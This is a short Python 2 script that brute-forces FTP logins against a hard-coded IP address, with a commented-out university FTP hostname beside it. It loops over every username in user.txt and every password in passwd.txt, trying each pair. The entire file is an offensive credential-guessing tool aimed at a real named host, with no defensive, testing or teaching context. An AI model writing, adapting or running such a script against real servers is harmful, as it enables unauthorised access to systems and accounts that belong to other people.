from ftplib import FTP
import pdb 

def main():

	# ftp = FTP('ccst.jlu.edu.cn')
	# pdb.set_trace()
	ftp = FTP('202.198.16.138')

	for user in open('user.txt', 'r'):
		for passwd in open('passwd.txt', 'r'):
			try:
				ftp.login(user=user, passwd=passwd)
			except Exception, ex:
				print ex


if __name__ == '__main__':
	main()
